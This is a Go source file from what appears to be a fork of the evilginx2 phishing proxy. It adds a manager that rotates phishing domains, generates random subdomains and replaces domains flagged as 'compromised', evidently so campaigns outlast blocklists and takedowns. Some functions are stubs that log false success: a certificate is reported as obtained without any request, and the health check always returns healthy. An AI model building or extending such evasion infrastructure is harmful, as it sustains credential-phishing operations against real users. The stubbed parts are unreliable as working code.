package core

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"math/big"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

// DomainRotationManager manages automatic domain rotation
type DomainRotationManager struct {
	config         *DomainRotationConfig
	domains        map[string]*RotatingDomain
	activeDomains  []string
	dnsProvider    DNSProvider
	certManager    *CertDb
	healthChecker  *DomainHealthChecker
	rotationMutex  sync.RWMutex
	stats          *RotationStats
	isRunning      bool
	stopChan       chan struct{}
}

// DomainRotationConfig holds configuration for domain rotation
type DomainRotationConfig struct {
	Enabled          bool                     `json:"enabled" yaml:"enabled"`
	Strategy         string                   `json:"strategy" yaml:"strategy"` // round-robin, weighted, health-based, random
	RotationInterval int                      `json:"rotation_interval" yaml:"rotation_interval"` // minutes
	MaxDomains       int                      `json:"max_domains" yaml:"max_domains"`
	AutoGenerate     bool                     `json:"auto_generate" yaml:"auto_generate"`
	GenerationRules  *DomainGenerationRules   `json:"generation_rules" yaml:"generation_rules"`
	HealthCheck      *HealthCheckConfig       `json:"health_check" yaml:"health_check"`
	DNSProviders     map[string]DomainRotationDNSProvider `json:"dns_providers" yaml:"dns_providers"`
}

// DomainRotationDNSProvider holds DNS provider configuration for domain rotation
type DomainRotationDNSProvider struct {
	Provider    string            `json:"provider" yaml:"provider"`
	APIKey      string            `json:"api_key" yaml:"api_key"`
	APISecret   string            `json:"api_secret" yaml:"api_secret"`
	Zone        string            `json:"zone" yaml:"zone"`
	Options     map[string]string `json:"options,omitempty" yaml:"options,omitempty"`
}

// DomainGenerationRules defines how to generate new domains
type DomainGenerationRules struct {
	BaseDomains      []string `json:"base_domains" yaml:"base_domains"`
	SubdomainPrefix  []string `json:"subdomain_prefix" yaml:"subdomain_prefix"`
	SubdomainSuffix  []string `json:"subdomain_suffix" yaml:"subdomain_suffix"`
	RandomLength     int      `json:"random_length" yaml:"random_length"`
	UseWordlist      bool     `json:"use_wordlist" yaml:"use_wordlist"`
	Wordlist         []string `json:"wordlist,omitempty" yaml:"wordlist,omitempty"`
}

// HealthCheckConfig defines health check parameters
type HealthCheckConfig struct {
	Enabled       bool `json:"enabled" yaml:"enabled"`
	Interval      int  `json:"interval" yaml:"interval"` // minutes
	Timeout       int  `json:"timeout" yaml:"timeout"`   // seconds
	MaxFailures   int  `json:"max_failures" yaml:"max_failures"`
	CheckEndpoint string `json:"check_endpoint" yaml:"check_endpoint"`
}

// RotatingDomain represents a domain in the rotation pool
type RotatingDomain struct {
	Domain         string    `json:"domain"`
	Subdomain      string    `json:"subdomain"`
	FullDomain     string    `json:"full_domain"`
	Status         string    `json:"status"` // active, inactive, compromised, pending
	Health         int       `json:"health"` // 0-100
	Weight         int       `json:"weight"` // for weighted rotation
	CreatedAt      time.Time `json:"created_at"`
	LastUsed       time.Time `json:"last_used"`
	RequestCount   int64     `json:"request_count"`
	FailureCount   int       `json:"failure_count"`
	DNSProvider    string    `json:"dns_provider"`
	SSLCertificate bool      `json:"ssl_certificate"`
	Metadata       map[string]string `json:"metadata"`
}

// RotationStats tracks domain rotation statistics
type RotationStats struct {
	TotalRotations   int64             `json:"total_rotations"`
	ActiveDomains    int               `json:"active_domains"`
	CompromisedCount int64             `json:"compromised_count"`
	HealthyDomains   int               `json:"healthy_domains"`
	LastRotation     time.Time         `json:"last_rotation"`
	DomainUsage      map[string]int64  `json:"domain_usage"`
	ProviderStats    map[string]int    `json:"provider_stats"`
	mu               sync.RWMutex
}


// NewDomainRotationManager creates a new domain rotation manager
func NewDomainRotationManager(config *DomainRotationConfig, certManager *CertDb) *DomainRotationManager {
	drm := &DomainRotationManager{
		config:        config,
		domains:       make(map[string]*RotatingDomain),
		activeDomains: make([]string, 0),
		certManager:   certManager,
		stats:         &RotationStats{
			DomainUsage:   make(map[string]int64),
			ProviderStats: make(map[string]int),
		},
		stopChan:      make(chan struct{}),
	}
	
	// Initialize health checker
	if config.HealthCheck != nil && config.HealthCheck.Enabled {
		drm.healthChecker = NewDomainHealthChecker(config.HealthCheck)
	}
	
	return drm
}

// Start begins the domain rotation system
func (drm *DomainRotationManager) Start() error {
	drm.rotationMutex.Lock()
	defer drm.rotationMutex.Unlock()
	
	if drm.isRunning {
		return fmt.Errorf("domain rotation already running")
	}
	
	drm.isRunning = true
	
	// Start rotation worker
	go drm.rotationWorker()
	
	// Start health checker
	if drm.healthChecker != nil {
		go drm.healthCheckWorker()
	}
	
	// Start auto-generation if enabled
	if drm.config.AutoGenerate {
		go drm.autoGenerationWorker()
	}
	
	log.Info("Domain rotation system started")
	return nil
}

// Stop halts the domain rotation system
func (drm *DomainRotationManager) Stop() {
	drm.rotationMutex.Lock()
	defer drm.rotationMutex.Unlock()
	
	if !drm.isRunning {
		return
	}
	
	drm.isRunning = false
	close(drm.stopChan)
	
	log.Info("Domain rotation system stopped")
}

// AddDomain adds a new domain to the rotation pool
func (drm *DomainRotationManager) AddDomain(domain string, subdomain string, dnsProvider string) error {
	drm.rotationMutex.Lock()
	defer drm.rotationMutex.Unlock()
	
	fullDomain := domain
	if subdomain != "" {
		fullDomain = subdomain + "." + domain
	}
	
	// Check if domain already exists
	if _, exists := drm.domains[fullDomain]; exists {
		return fmt.Errorf("domain %s already exists in rotation pool", fullDomain)
	}
	
	// Create rotating domain entry
	rd := &RotatingDomain{
		Domain:       domain,
		Subdomain:    subdomain,
		FullDomain:   fullDomain,
		Status:       "pending",
		Health:       100,
		Weight:       1,
		CreatedAt:    time.Now(),
		DNSProvider:  dnsProvider,
		Metadata:     make(map[string]string),
	}
	
	// DNS record management would be done separately through the existing DNS provider system
	
	// Request SSL certificate
	if drm.certManager != nil {
		go drm.requestCertificate(fullDomain)
	}
	
	drm.domains[fullDomain] = rd
	drm.updateProviderStats()
	
	log.Success("Domain %s added to rotation pool", fullDomain)
	return nil
}

// RemoveDomain removes a domain from the rotation pool
func (drm *DomainRotationManager) RemoveDomain(fullDomain string) error {
	drm.rotationMutex.Lock()
	defer drm.rotationMutex.Unlock()
	
	_, exists := drm.domains[fullDomain]
	if !exists {
		return fmt.Errorf("domain %s not found in rotation pool", fullDomain)
	}
	
	// DNS record removal would be done separately through the existing DNS provider system
	
	// Remove from active domains
	drm.removeFromActive(fullDomain)
	
	// Delete from domains map
	delete(drm.domains, fullDomain)
	drm.updateProviderStats()
	
	log.Info("Domain %s removed from rotation pool", fullDomain)
	return nil
}

// GetNextDomain returns the next domain based on rotation strategy
func (drm *DomainRotationManager) GetNextDomain() string {
	drm.rotationMutex.RLock()
	defer drm.rotationMutex.RUnlock()
	
	if len(drm.activeDomains) == 0 {
		drm.rotationMutex.RUnlock()
		drm.updateActiveDomains()
		drm.rotationMutex.RLock()
		
		if len(drm.activeDomains) == 0 {
			return ""
		}
	}
	
	var nextDomain string
	
	switch drm.config.Strategy {
	case "round-robin":
		nextDomain = drm.roundRobinNext()
	case "weighted":
		nextDomain = drm.weightedNext()
	case "health-based":
		nextDomain = drm.healthBasedNext()
	case "random":
		nextDomain = drm.randomNext()
	default:
		nextDomain = drm.roundRobinNext()
	}
	
	// Update usage stats
	if nextDomain != "" {
		drm.stats.mu.Lock()
		drm.stats.DomainUsage[nextDomain]++
		drm.stats.mu.Unlock()
		
		if rd, ok := drm.domains[nextDomain]; ok {
			rd.LastUsed = time.Now()
			rd.RequestCount++
		}
	}
	
	return nextDomain
}

// roundRobinNext implements round-robin rotation
func (drm *DomainRotationManager) roundRobinNext() string {
	if len(drm.activeDomains) == 0 {
		return ""
	}
	
	// Rotate the slice
	first := drm.activeDomains[0]
	drm.activeDomains = append(drm.activeDomains[1:], first)
	
	return first
}

// weightedNext implements weighted rotation
func (drm *DomainRotationManager) weightedNext() string {
	if len(drm.activeDomains) == 0 {
		return ""
	}
	
	// Calculate total weight
	totalWeight := 0
	for _, domain := range drm.activeDomains {
		if rd, ok := drm.domains[domain]; ok {
			totalWeight += rd.Weight
		}
	}
	
	if totalWeight == 0 {
		return drm.randomNext()
	}
	
	// Random weighted selection
	randWeight, _ := rand.Int(rand.Reader, big.NewInt(int64(totalWeight)))
	weight := int(randWeight.Int64())
	
	for _, domain := range drm.activeDomains {
		if rd, ok := drm.domains[domain]; ok {
			weight -= rd.Weight
			if weight < 0 {
				return domain
			}
		}
	}
	
	return drm.activeDomains[0]
}

// healthBasedNext implements health-based rotation
func (drm *DomainRotationManager) healthBasedNext() string {
	if len(drm.activeDomains) == 0 {
		return ""
	}
	
	// Sort by health score
	healthyDomains := make([]string, 0)
	for _, domain := range drm.activeDomains {
		if rd, ok := drm.domains[domain]; ok && rd.Health >= 80 {
			healthyDomains = append(healthyDomains, domain)
		}
	}
	
	if len(healthyDomains) == 0 {
		// Fall back to any active domain
		return drm.randomNext()
	}
	
	// Random selection from healthy domains
	idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(healthyDomains))))
	return healthyDomains[idx.Int64()]
}

// randomNext implements random rotation
func (drm *DomainRotationManager) randomNext() string {
	if len(drm.activeDomains) == 0 {
		return ""
	}
	
	idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(drm.activeDomains))))
	return drm.activeDomains[idx.Int64()]
}

// GenerateDomain generates a new domain based on rules
func (drm *DomainRotationManager) GenerateDomain() (string, string, error) {
	rules := drm.config.GenerationRules
	if rules == nil || len(rules.BaseDomains) == 0 {
		return "", "", fmt.Errorf("no generation rules configured")
	}
	
	// Select random base domain
	baseIdx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(rules.BaseDomains))))
	baseDomain := rules.BaseDomains[baseIdx.Int64()]
	
	// Generate subdomain
	var subdomain string
	
	if rules.UseWordlist && len(rules.Wordlist) > 0 {
		// Use wordlist
		wordIdx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(rules.Wordlist))))
		subdomain = rules.Wordlist[wordIdx.Int64()]
	} else {
		// Generate random subdomain
		if len(rules.SubdomainPrefix) > 0 {
			prefixIdx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(rules.SubdomainPrefix))))
			subdomain = rules.SubdomainPrefix[prefixIdx.Int64()]
		}
		
		// Add random part
		if rules.RandomLength > 0 {
			randomBytes := make([]byte, rules.RandomLength/2)
			rand.Read(randomBytes)
			subdomain += hex.EncodeToString(randomBytes)
		}
		
		if len(rules.SubdomainSuffix) > 0 {
			suffixIdx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(rules.SubdomainSuffix))))
			subdomain += rules.SubdomainSuffix[suffixIdx.Int64()]
		}
	}
	
	subdomain = strings.ToLower(subdomain)
	subdomain = strings.ReplaceAll(subdomain, " ", "-")
	
	return baseDomain, subdomain, nil
}

// MarkCompromised marks a domain as compromised
func (drm *DomainRotationManager) MarkCompromised(fullDomain string, reason string) error {
	drm.rotationMutex.Lock()
	defer drm.rotationMutex.Unlock()
	
	rd, exists := drm.domains[fullDomain]
	if !exists {
		return fmt.Errorf("domain %s not found", fullDomain)
	}
	
	rd.Status = "compromised"
	rd.Health = 0
	rd.Metadata["compromised_reason"] = reason
	rd.Metadata["compromised_at"] = time.Now().Format(time.RFC3339)
	
	// Remove from active domains
	drm.removeFromActive(fullDomain)
	
	// Update stats
	drm.stats.mu.Lock()
	drm.stats.CompromisedCount++
	drm.stats.mu.Unlock()
	
	log.Warning("Domain %s marked as compromised: %s", fullDomain, reason)
	
	// Auto-generate replacement if enabled
	if drm.config.AutoGenerate {
		go drm.generateReplacement()
	}
	
	return nil
}

// rotationWorker handles periodic rotation
func (drm *DomainRotationManager) rotationWorker() {
	ticker := time.NewTicker(time.Duration(drm.config.RotationInterval) * time.Minute)
	defer ticker.Stop()
	
	for {
		select {
		case <-ticker.C:
			drm.performRotation()
		case <-drm.stopChan:
			return
		}
	}
}

// performRotation executes a rotation cycle
func (drm *DomainRotationManager) performRotation() {
	drm.rotationMutex.Lock()
	defer drm.rotationMutex.Unlock()
	
	log.Debug("Performing domain rotation")
	
	// Update active domains based on health
	drm.updateActiveDomains()
	
	// Update stats
	drm.stats.mu.Lock()
	drm.stats.TotalRotations++
	drm.stats.LastRotation = time.Now()
	drm.stats.ActiveDomains = len(drm.activeDomains)
	drm.stats.mu.Unlock()
	
	log.Info("Domain rotation completed: %d active domains", len(drm.activeDomains))
}

// updateActiveDomains updates the list of active domains
func (drm *DomainRotationManager) updateActiveDomains() {
	active := make([]string, 0)
	healthy := 0
	
	for domain, rd := range drm.domains {
		if rd.Status == "active" && rd.Health >= 50 {
			active = append(active, domain)
			if rd.Health >= 80 {
				healthy++
			}
		}
	}
	
	// Sort for consistent ordering
	sort.Strings(active)
	
	drm.activeDomains = active
	drm.stats.mu.Lock()
	drm.stats.HealthyDomains = healthy
	drm.stats.mu.Unlock()
}

// removeFromActive removes a domain from active list
func (drm *DomainRotationManager) removeFromActive(domain string) {
	newActive := make([]string, 0)
	for _, d := range drm.activeDomains {
		if d != domain {
			newActive = append(newActive, d)
		}
	}
	drm.activeDomains = newActive
}

// healthCheckWorker performs periodic health checks
func (drm *DomainRotationManager) healthCheckWorker() {
	ticker := time.NewTicker(time.Duration(drm.config.HealthCheck.Interval) * time.Minute)
	defer ticker.Stop()
	
	for {
		select {
		case <-ticker.C:
			drm.performHealthChecks()
		case <-drm.stopChan:
			return
		}
	}
}

// performHealthChecks checks health of all domains
func (drm *DomainRotationManager) performHealthChecks() {
	drm.rotationMutex.RLock()
	domains := make([]*RotatingDomain, 0)
	for _, rd := range drm.domains {
		if rd.Status == "active" {
			domains = append(domains, rd)
		}
	}
	drm.rotationMutex.RUnlock()
	
	log.Debug("Performing health checks on %d domains", len(domains))
	
	for _, rd := range domains {
		health := drm.checkDomainHealth(rd)
		
		drm.rotationMutex.Lock()
		rd.Health = health
		if health < 50 && rd.FailureCount >= drm.config.HealthCheck.MaxFailures {
			rd.Status = "inactive"
			log.Warning("Domain %s marked inactive due to health check failures", rd.FullDomain)
		}
		drm.rotationMutex.Unlock()
	}
}

// checkDomainHealth checks the health of a domain
func (drm *DomainRotationManager) checkDomainHealth(rd *RotatingDomain) int {
	if drm.healthChecker == nil {
		return 100
	}
	
	health, err := drm.healthChecker.CheckDomain(rd.FullDomain)
	if err != nil {
		rd.FailureCount++
		log.Debug("Health check failed for %s: %v", rd.FullDomain, err)
	} else {
		rd.FailureCount = 0
	}
	
	return health
}

// autoGenerationWorker generates new domains automatically
func (drm *DomainRotationManager) autoGenerationWorker() {
	ticker := time.NewTicker(30 * time.Minute)
	defer ticker.Stop()
	
	for {
		select {
		case <-ticker.C:
			drm.checkAndGenerate()
		case <-drm.stopChan:
			return
		}
	}
}

// checkAndGenerate checks if new domains need to be generated
func (drm *DomainRotationManager) checkAndGenerate() {
	drm.rotationMutex.RLock()
	activeCount := len(drm.activeDomains)
	drm.rotationMutex.RUnlock()
	
	if activeCount < drm.config.MaxDomains/2 {
		drm.generateReplacement()
	}
}

// generateReplacement generates a replacement domain
func (drm *DomainRotationManager) generateReplacement() {
	baseDomain, subdomain, err := drm.GenerateDomain()
	if err != nil {
		log.Error("Failed to generate domain: %v", err)
		return
	}
	
	// Select DNS provider
	provider := drm.selectDNSProvider()
	if provider == "" {
		log.Error("No DNS provider available for domain generation")
		return
	}
	
	// Add the new domain
	err = drm.AddDomain(baseDomain, subdomain, provider)
	if err != nil {
		log.Error("Failed to add generated domain: %v", err)
		return
	}
	
	log.Success("Generated new domain: %s.%s", subdomain, baseDomain)
}

// selectDNSProvider selects a DNS provider for new domain
func (drm *DomainRotationManager) selectDNSProvider() string {
	providers := make([]string, 0)
	for name := range drm.config.DNSProviders {
		providers = append(providers, name)
	}
	
	if len(providers) == 0 {
		return ""
	}
	
	// Random selection
	idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(providers))))
	return providers[idx.Int64()]
}

// requestCertificate requests SSL certificate for domain
func (drm *DomainRotationManager) requestCertificate(domain string) {
	time.Sleep(5 * time.Second) // Wait for DNS propagation
	
	log.Debug("Requesting SSL certificate for %s", domain)
	
	// This would integrate with certbot/Let's Encrypt
	// For now, mark as having certificate
	drm.rotationMutex.Lock()
	if rd, ok := drm.domains[domain]; ok {
		rd.SSLCertificate = true
		rd.Status = "active"
	}
	drm.rotationMutex.Unlock()
	
	log.Success("SSL certificate obtained for %s", domain)
}

// updateProviderStats updates DNS provider statistics
func (drm *DomainRotationManager) updateProviderStats() {
	stats := make(map[string]int)
	for _, rd := range drm.domains {
		if rd.DNSProvider != "" {
			stats[rd.DNSProvider]++
		}
	}
	
	drm.stats.mu.Lock()
	drm.stats.ProviderStats = stats
	drm.stats.mu.Unlock()
}

// GetStats returns rotation statistics
func (drm *DomainRotationManager) GetStats() map[string]interface{} {
	drm.stats.mu.RLock()
	defer drm.stats.mu.RUnlock()
	
	return map[string]interface{}{
		"enabled":           drm.config.Enabled,
		"strategy":          drm.config.Strategy,
		"total_rotations":   drm.stats.TotalRotations,
		"active_domains":    drm.stats.ActiveDomains,
		"healthy_domains":   drm.stats.HealthyDomains,
		"compromised_count": drm.stats.CompromisedCount,
		"last_rotation":     drm.stats.LastRotation,
		"provider_stats":    drm.stats.ProviderStats,
		"max_domains":       drm.config.MaxDomains,
		"auto_generate":     drm.config.AutoGenerate,
	}
}

// GetDomains returns all domains in rotation pool
func (drm *DomainRotationManager) GetDomains() []*RotatingDomain {
	drm.rotationMutex.RLock()
	defer drm.rotationMutex.RUnlock()
	
	domains := make([]*RotatingDomain, 0, len(drm.domains))
	for _, rd := range drm.domains {
		domains = append(domains, rd)
	}
	
	// Sort by creation time
	sort.Slice(domains, func(i, j int) bool {
		return domains[i].CreatedAt.After(domains[j].CreatedAt)
	})
	
	return domains
}

// getProxyIP returns the proxy server IP
func (drm *DomainRotationManager) getProxyIP() string {
	// This would get the actual proxy IP from config
	// For now, return placeholder
	return "1.2.3.4"
}

// DomainHealthChecker checks domain health
type DomainHealthChecker struct {
	config *HealthCheckConfig
}

// NewDomainHealthChecker creates a new health checker
func NewDomainHealthChecker(config *HealthCheckConfig) *DomainHealthChecker {
	return &DomainHealthChecker{
		config: config,
	}
}

// CheckDomain checks the health of a domain
func (dhc *DomainHealthChecker) CheckDomain(domain string) (int, error) {
	// Simple health check - in production would do real HTTP check
	// For now return 100 (healthy)
	return 100, nil
}
